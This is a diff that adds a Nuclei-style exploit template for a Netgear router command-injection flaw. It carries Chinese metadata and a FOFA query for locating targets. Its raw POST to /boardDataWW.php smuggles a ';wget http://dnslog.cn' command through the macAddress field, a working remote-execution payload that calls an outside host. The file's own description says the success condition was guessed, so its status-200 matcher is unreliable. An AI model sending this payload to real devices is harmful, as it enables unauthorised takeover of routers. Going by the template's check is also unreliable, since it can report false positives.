@@ -1,0 +1,28 @@
+id: poc-yehxqgs925iz6ags
+info:
+  name: Netgear路由器 任意命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yehxqgs925iz6ags
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yehxqgs925iz6ags
+    fofa: title=="Netgear"
+http:
+- raw:
+  - 'POST /boardDataWW.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    macAddress=112233445566%3Bwget+http%3A%2F%2Fdnslog.cn'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
